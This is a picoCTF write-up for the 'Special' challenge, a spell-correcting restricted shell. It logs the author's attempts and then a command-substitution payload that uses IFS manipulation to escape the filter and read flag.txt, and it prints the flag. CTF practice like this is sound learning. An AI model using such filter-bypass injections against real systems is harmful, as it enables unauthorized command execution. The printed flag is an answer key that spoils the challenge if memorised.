## Descripción
Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)Start your instance to see connection details.

Additional details will be available after launching your challenge instance.

Hints:
1. Experiment with different shell syntax
## Solución 
~~~
Special$ ls
Is 
sh: 1: Is: not found
Special$ /bin/ls
Absolutely not paths like that, please!
Special$ echo Hola
Echo Hola 
sh: 1: Echo: not found
Special$ echo $PATH
Echo path 
sh: 1: Echo: not found
Special$ x=ls
Pals 
sh: 1: Pals: not found
Special$ $x
Ex 
sh: 1: Ex: not found
Special$ b=cat
Beat 
sh: 1: Beat: not found
Special$ IFS=]
Ifs 
sh: 1: Ifs: not found
Special$ echo Hola]Mundo
Echo Hola]Mundo 
sh: 1: Echo: not found
Special$ $(IFS=];b=cat]blargh/flag.txt;$b)
$(IFS=];b=cat]blargh/flag.txt;$b) 
sh: 1: picoCTF{5p311ch3ck_15_7h3_w0r57_b741d1b1}: not found
Special$ Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.
SrRiv-picoctf@webshell:~$ 


picoCTF{5p311ch3ck_15_7h3_w0r57_b741d1b1}

~~~
## Notas adicionales 
## Referencias
